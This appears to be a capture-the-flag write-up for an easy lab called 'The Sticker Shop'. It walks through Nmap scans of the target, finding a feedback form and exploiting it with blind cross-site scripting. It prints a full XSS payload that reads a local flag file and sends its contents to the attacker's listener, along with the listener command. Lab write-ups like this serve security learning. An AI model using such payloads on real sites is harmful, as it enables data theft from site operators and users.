Title: The Sticker Shop
Difficulty: Easy
Category: Red 

1. Reconnaissance

In recon phase, the first approachh I did is to launch an Nmap scan on the target ip {10.49.138.65}

nmap 10.49.138.65

It seems there are two ports that are opened

![alt text](photos/1nmap.png)

    22/tcp   open  ssh
    8080/tcp open  http-proxy

Lets scan it again with nmap but this time with -sV and -sC flag to find out which version the services are running and if there are any known vulnerabilities in it

nmap -sV -sC 10.49.138.65
![alt text](photos/2nmap.png)

Port 8080 is running Werkzeug httpd 3.0.1, we'll keep that in mind

2. Opening the Web App

When exploring the website, it greets us a static website. The website has two pages Home and Feedback. The feedback page gives us a section where we can input a our feedback and send it to there server. Which may suggest we this website might be vulnerable to blind xss.

![alt text](photos/feedback.png)

3. Attack Phase

In order to fetch the flag from the target server, I started a python http server so my machine can receive requests from the payload were about to inject

    python -m http.server 1010

![alt text](photos/py.png)

Now since our http server is ready we now need an xss payload to inject to the server. Since I am not really familliar with blind xss vulnerabilities I did some research online for some ready-made blind xss and I suggest you do too. This is the payload that I found

    '"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));
    });
    </script>

Now replace it with your IP address and the port your python server is being hosted

![alt text](photos/injecting.png)

4. Retrieving the Flag

After injecting the payload, my listening server then receives the flag that is URL encoded
![alt text](photos/encodeflag.png)
